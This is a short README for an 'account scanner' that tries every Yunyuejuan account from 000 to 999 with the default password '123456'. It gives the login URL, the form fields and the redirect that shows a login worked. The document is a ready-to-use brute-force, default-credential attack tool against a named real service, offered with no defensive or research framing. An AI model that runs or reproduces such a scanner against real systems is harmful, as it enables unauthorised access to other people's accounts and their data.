# Yunyuejuan account scanner
## Usage
This application will test all the Yunyuejuan accounts from 000 to 999 to find out the accessible ones.

## Build
```shell
cargo build --release
```

## API
POST this form to `http://sc.yunyuejuan.net/SystemLogin` to check if the account is accessible.
```javascript
{
	"j_username": "username",
	"j_password": "123456" //Default password
}
```
If accessible, the `Location` in response header is `http://sc.yunyuejuan.net/navigation`.

## Special Thanks
Thanks to @pumkin1001 for providing the API.

